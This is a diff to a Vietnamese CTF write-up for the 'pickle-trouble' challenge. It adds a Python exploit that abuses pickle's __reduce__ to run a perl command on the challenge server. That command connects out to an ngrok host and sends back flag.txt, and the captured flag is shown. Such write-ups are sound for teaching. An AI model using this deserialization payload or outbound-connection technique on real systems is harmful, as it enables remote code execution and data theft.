@@ -156,5 +156,36 @@ if __name__ == "__main__":
         return data
 ```
 - Hàm recive bắt buộc phải nhận đúng 256 byte nếu không sẽ bị lỗi.
-- Từ đó ý tưởng của mình là viết một script để RCE vào
+- Ý tưởng của mình ngrok để dựng lên một TCP server rồi dùng perl để mở lại stdin stdout stderr và ```cat flag.txt```
+```py
+import pickle
+import base64
+import os
+import pandas
+
+#r = remote("127.0.0.1", 4135)
+r = remote(
+    "pickle-trouble-0d7cddd74709c50c.chall.ctf.blackpinker.com", 443, ssl=True)
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = 'perl -e \'use Socket;'
+        cmd += "$i='0.tcp.ap.ngrok.io'; $p=10151;"
+        cmd += "socket(s, PF_INET, SOCK_STREAM, getprotobyname('tcp'));"
+        cmd += "if(connect(s,sockaddr_in($p, inet_aton($i))))"
+        cmd += "{open(STDIN, '>&s');open(STDOUT,'>&s'); open(STDERR, '>&s'); exec('cat flag.txt');};\"
+        cmd = cmd.ljust(256, 'S')
+        return os.system, (cmd,)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    r.recvuntil(b"byte string)\n")
+    r.sendline(b'256')
+    r.recvuntil(b'(raw bytes)\n')
+    r.sendline(pickled)
+    r.interactive()
+    ```
+  Flag : ```HCMUS-CTF{S||\/|pL3_p1cKlE_ExpL01t-Huh}```
 
